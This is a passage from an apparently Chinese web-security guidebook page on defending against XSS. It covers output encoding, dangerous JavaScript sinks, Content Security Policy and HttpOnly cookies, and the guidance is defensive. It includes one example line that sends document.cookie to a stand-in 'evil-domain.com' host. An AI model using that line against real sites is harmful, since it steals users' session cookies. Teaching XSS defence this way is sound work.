</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- JavaScript 内联代码块 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">script</span><span class="token tag"> </span><span class="token tag attr-name">type</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">application/javascript</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword">var</span><span class="token script language-javascript"> msg </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript string">&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript function">alert</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript">msg</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">script</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">script</span><span class="token tag"> </span><span class="token tag attr-name">type</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">application/javascript</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword">var</span><span class="token script language-javascript"> __INITIAL_STATE__ </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript known-class-name class-name">JSON</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">parse</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript string">&#x27;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&#x27;</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">script</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- HTML 标签内联监听器 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">button</span><span class="token tag"> </span><span class="token tag special-attr attr-name">onclick</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag special-attr attr-value value javascript language-javascript function">alert</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript string">&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">;</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  click me</span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">button</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- URL 参数 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">a</span><span class="token tag"> </span><span class="token tag attr-name">href</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token tag punctuation">&lt;/</span><span class="token tag">a</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- URL 路径 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">a</span><span class="token tag"> </span><span class="token tag attr-name">href</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token tag punctuation">&lt;/</span><span class="token tag">a</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!--</span></div><div class="token-line"><span class="token comment">  URL.</span></div><div class="token-line"><span class="token comment">  注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 Scheme 等</span></div><div class="token-line"><span class="token comment">--&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">a</span><span class="token tag"></span></div><div class="token-line"><span class="token tag">  </span><span class="token tag attr-name">href</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value">&lt;%=</span></div><div class="token-line"><span class="token tag attr-value">    urlValidator.isValid(UNTRUSTED) ?</span></div><div class="token-line"><span class="token tag attr-value">      Encode.forHtml(UNTRUSTED) :</span></div><div class="token-line"><span class="token tag attr-value">    </span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">/404</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value"></span></div><div class="token-line"><span class="token tag attr-value">  %&gt;</span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag"></span></div><div class="token-line"><span class="token tag"></span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  link</span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">a</span><span class="token tag punctuation">&gt;</span></div></pre></div><h3 id="禁止执行不可信数据"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#禁止执行不可信数据"><span class="icon icon-link"></span></a>禁止执行不可信数据</h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue / React 技术栈，并且不使用 <code>v-html</code> / <code>dangerouslySetInnerHTML</code> 功能，就在前端 <code>render</code> 渲染阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>以下方式都能把字符串作为代码运行：</p><ul><li>DOM 中的内联事件监听器：如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等</li><li>HTML DOM 标签属性：<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性</li><li>JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等</li></ul><p>如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><div class="__dumi-default-code-block"><pre class="prism-code language-html"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">img</span><span class="token tag"> </span><span class="token tag special-attr attr-name">onclick</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag special-attr attr-value value javascript language-javascript constant">UNTRUSTED</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag special-attr attr-name">onerror</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag special-attr attr-value value javascript language-javascript constant">UNTRUSTED</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">src</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">data:image/png,</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag punctuation">/&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- 链接内包含恶意代码 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">a</span><span class="token tag"> </span><span class="token tag attr-name">href</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">UNTRUSTED</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token plain">1</span><span class="token tag punctuation">&lt;/</span><span class="token tag">a</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">script</span><span class="token tag"> </span><span class="token tag attr-name">type</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">application/javascript</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript comment">// setTimeout()/setInterval() 中调用恶意代码</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript function">setTimeout</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript string">&#x27;UNTRUSTED&#x27;</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript function">setInterval</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript string">&#x27;UNTRUSTED&#x27;</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">
</span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript comment">// location 调用恶意代码</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript dom variable">location</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript property-access">href</span><span class="token script language-javascript"> </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript string">&#x27;UNTRUSTED&#x27;</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">
</span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript comment">// eval() 中调用恶意代码</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript function">eval</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript string">&#x27;UNTRUSTED&#x27;</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">script</span><span class="token tag punctuation">&gt;</span></div></pre></div><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p><h3 id="內容安全策略"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#內容安全策略"><span class="icon icon-link"></span></a>內容安全策略</h3><p><strong>内容安全策略</strong>（Content Security Policy，简称 CSP）是一种 <strong>可信白名单</strong> 作机制，来限制网站中是否可以包含某来源内容。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需提供配置。</p><p><strong>启用 CSP 方式</strong></p><ol><li>设置 HTTP 头信息的 Content-Security-Policy 字段</li></ol><div class="__dumi-default-code-block"><pre class="prism-code language-http"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token header header-name keyword">content-security-policy</span><span class="token header punctuation">:</span><span class="token header"> </span><span class="token header header-value csp languages-csp">default-scr https:; connect-src https:; font-src https: data:; frame-src https: twitter:; img-src https: data:; media-src https:; object-src https:; script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; https:; style-src &#x27;unsafe-inline&#x27; https:;</span></div></pre></div><ol start="2"><li>通过网页 <code>&lt;meta&gt;</code> 标签</li></ol><div class="__dumi-default-code-block"><pre class="prism-code language-html"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">&lt;!-- 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名) --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">meta</span><span class="token tag"> </span><span class="token tag attr-name">http-equiv</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">Content-Security-Policy</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">content</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">efault-src </span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value">self</span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag punctuation">/&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- 一个网站管理者允许内容来自信任的域名及其子域名 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">meta</span><span class="token tag"> </span><span class="token tag attr-name">http-equiv</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">Content-Security-Policy</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">content</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">default-src </span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value">self</span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value"> *.trusted.com</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag punctuation">/&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- 一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者（获得），所有脚本必须从特定主机服务器获取可信的代码。 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">meta</span><span class="token tag"></span></div><div class="token-line"><span class="token tag">  </span><span class="token tag attr-name">http-equiv</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">Content-Security-Policy</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"></span></div><div class="token-line"><span class="token tag">  </span><span class="token tag attr-name">content</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">default-src </span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value">self</span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value">; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"></span></div><div class="token-line"><span class="token tag"></span><span class="token tag punctuation">/&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- 一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">meta</span><span class="token tag"></span></div><div class="token-line"><span class="token tag">  </span><span class="token tag attr-name">http-equiv</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">Content-Security-Policy</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"></span></div><div class="token-line"><span class="token tag">  </span><span class="token tag attr-name">content</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">default-src https://onlinebanking.jumbobank.com</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"></span></div><div class="token-line"><span class="token tag"></span><span class="token tag punctuation">/&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!--  一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容（从任意位置加载）。 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">meta</span><span class="token tag"> </span><span class="token tag attr-name">http-equiv</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">Content-Security-Policy</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">content</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">default-src </span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value">self</span><span class="token tag attr-value punctuation">&#x27;</span><span class="token tag attr-value"> *.mailsite.com; img-src *</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag punctuation">/&gt;</span></div></pre></div><p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p><p>严格的 CSP 在 XSS 的防范中可以起到下列的作用：</p><ul><li>禁止加载外域代码，防止复杂的攻击逻辑</li><li>禁止外域提交，网站被攻击后，用户的数据不会泄漏到外域</li><li>禁止内联脚本执行（规则较严格，目前发现 Github 使用）</li><li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）</li><li>合理使用上报可以及时发现 XSS，利于尽快修复问题</li></ul><blockquote><p>更多关于 CSP 的理解可以参考 <a target="_blank" rel="noopener noreferrer" href="https://www.zhihu.com/question/21979782">Content Security Policy（CSP）是什么？为什么它能低于 XSS 攻击？<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p><p>或者查看关于 <a href="/black-javascript-guidebook//computer-networks/http/content-security-policy">HTTP CSP 内容安全策略</a> 的整理。</p></blockquote><h3 id="httponly-cookie"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#httponly-cookie"><span class="icon icon-link"></span></a>HTTPOnly Cookie</h3><p>窃取网页 Cookie 的示例：</p><div class="__dumi-default-code-block"><pre class="prism-code language-js"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token keyword">new</span><span class="token plain"> </span><span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">src</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string">&#x27;http://www.evil-domain.com/steal-cookie.php?cookie=&#x27;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token property-access">cookie</span><span class="token punctuation">;</span></div></pre></div><p>使用 HttpOnly Cookie 将重要的 Cookie 标记为 <code>http-only</code>，这样的话当浏览器向 Web 服务器发起请求的时就会带上 Cookie 字段，但是在 JavaScript 脚本中却不能访问这个 Cookie，这样就避免了 XSS 攻击利用 JavaScript 的 <code>document.cookie</code> 获取 Cookie。</p><p>在 Koa 中设置 Cookie <code>httpOnly</code> 属性：</p><div class="__dumi-default-code-block"><pre class="prism-code language-js"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token keyword">const</span><span class="token plain"> </span><span class="token maybe-class-name">Koa</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#x27;koa&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token keyword">const</span><span class="token plain"> app </span><span class="token operator">=</span><span class="token plain"> </span><span class="token keyword">new</span><span class="token plain"> </span><span class="token class-name">Koa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">app</span><span class="token punctuation">.</span><span class="token method function property-access">use</span><span class="token punctuation">(</span><span class="token keyword">async</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token parameter">ctx</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token arrow operator">=&gt;</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword control-flow">if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">ctx</span><span class="token punctuation">.</span><span class="token property-access">url</span><span class="token plain"> </span><span class="token operator">===</span><span class="token plain"> </span><span class="token string">&#x27;/index&#x27;</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">    ctx</span><span class="token punctuation">.</span><span class="token property-access">cookie</span><span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span><span class="token string">&#x27;cid&#x27;</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;hello world&#x27;</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token comment">// 写 Cookie 所在域名</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token literal-property property">domain</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string">&#x27;localhost&#x27;</span><span class="token punctuation">,</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token comment">// 写 Cookie 所在的路径</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string">&#x27;/index&#x27;</span><span class="token punctuation">,</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token comment">// Cookie 有效时长</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token literal-property property">maxAge</span><span class="token operator">:</span><span class="token plain"> </span><span class="token number">10</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">60</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token comment">// Cookie 失效时间</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token literal-property property">expires</span><span class="token operator">:</span><span class="token plain"> </span><span class="token keyword">new</span><span class="token plain"> </span><span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">&#x27;2017-02-15&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token comment">// 是否只用于 HTTP 请求中获取</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token literal-property property">httpOnly</span><span class="token operator">:</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token comment">// 是否允许重写</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token literal-property property">overwrite</span><span class="token operator">:</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">    </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">    ctx</span><span class="token punctuation">.</span><span class="token property-access">body</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string">&#x27;Cookie is ok.&#x27;</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token punctuation">}</span><span class="token plain"> </span><span class="token keyword control-flow">else</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">    ctx</span><span class="token punctuation">.</span><span class="token property-access">body</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string">&#x27;Hello world!&#x27;</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token punctuation">}</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">app</span><span class="token punctuation">.</span><span class="token method function property-access">listen</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token arrow operator">=&gt;</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token string">&#x27;[demo] Cookie is starting at port 3000&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></pre></div><p>在 Chrome 浏览器 Application 面板查看 Cookie 缓存可以直到哪些 Cookie 字段设置了 HttpOnly：</p></div><img alt="Cookies HttpOnly" src="/black-javascript-guidebook/static/xss-cookies-httponly.b5efd5ae.jpg" width="720"/><div class="markdown"><h2 id="参考资料"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#参考资料"><span class="icon icon-link"></span></a>参考资料</h2><ul><li><a target="_blank" rel="noopener noreferrer" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">📖 MDN: 内容安全策略(CSP)<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://www.bilibili.com/video/av56520828">📽 Web 安全之 XSS 攻击与防御<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://juejin.im/post/6844903685122703367">📝 美团技术团队 前端安全系列：如何防止 XSS 攻击?<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" 